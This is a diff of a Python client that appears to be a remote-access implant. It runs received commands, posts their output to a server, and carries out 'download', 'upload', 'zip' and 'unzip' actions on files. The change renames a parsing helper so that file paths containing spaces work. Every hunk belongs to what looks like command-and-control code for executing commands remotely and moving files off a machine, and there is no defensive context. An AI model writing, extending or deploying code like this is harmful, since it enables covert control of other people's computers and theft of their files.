@@ -21,13 +21,10 @@ def post_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
     except exceptions.RequestException as e:
         return print(e + "\n")
     
-def get_third_item(input_string, replace=True):
+def get_filename(input_string, replace=True):
     """This function that splits a str & return the 3rd item reformatted ;)"""
     try:
-        if replace:
-            return input_string.split()[2].replace("\\", "/")
-        else:
-            return input_string.split()[2]
+        return " ".join(input_string.split()[2:]).replace("\\", "/")
     except IndexError:
         post_to_server(f"You must enter a argument after {input_string}.\n")
 
@@ -74,7 +71,7 @@ while True:
         post_to_server(cmd_output.stdout.decode())
 
     elif cmd.startswith('client download'):
-        filepath = get_third_item(cmd)
+        filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
         filename = path.basename(filepath)
@@ -90,7 +87,7 @@ while True:
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
     elif cmd.startswith('client upload'):
-        filepath = get_third_item(cmd)
+        filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
         filename = path.basename(filepath)
@@ -103,7 +100,7 @@ while True:
             post_to_server(f"Unable to access {filepath} on {client}.\n")
         
     elif cmd.startswith('client zip'):
-        filepath = get_third_item(cmd)
+        filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
         filename = path.basename(filepath)
@@ -122,7 +119,7 @@ while True:
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
     elif cmd.startswith('client unzip'):
-        filepath = get_third_item(cmd)
+        filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
         filename = path.basename(filepath)
